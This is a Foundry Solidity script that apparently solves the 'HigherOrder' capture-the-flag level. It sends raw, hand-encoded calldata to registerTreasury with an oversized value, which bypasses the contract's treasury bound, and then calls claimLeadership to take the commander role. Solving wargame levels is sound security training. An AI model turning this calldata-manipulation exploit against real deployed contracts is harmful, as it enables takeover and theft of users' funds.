// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import "../src/HigherOrder.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract HigherOrderSolution is Script {
    HigherOrder public higherOrder = HigherOrder(0xC6C56Ea819dE46d99B6b4723D6b298359429DF58);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Player : ", vm.envAddress("MY_ADDRESS"));
        console.log("Before commander : ", higherOrder.commander());
        console.log("Before treasury : ", higherOrder.treasury());

        address(higherOrder).call(
            abi.encodePacked(
                higherOrder.registerTreasury.selector,
                abi.encode(0xFFF)
            )
        );

        higherOrder.claimLeadership();

        console.log("After commander : ", higherOrder.commander());
        console.log("After treasury : ", higherOrder.treasury());

        vm.stopBroadcast();
    }
}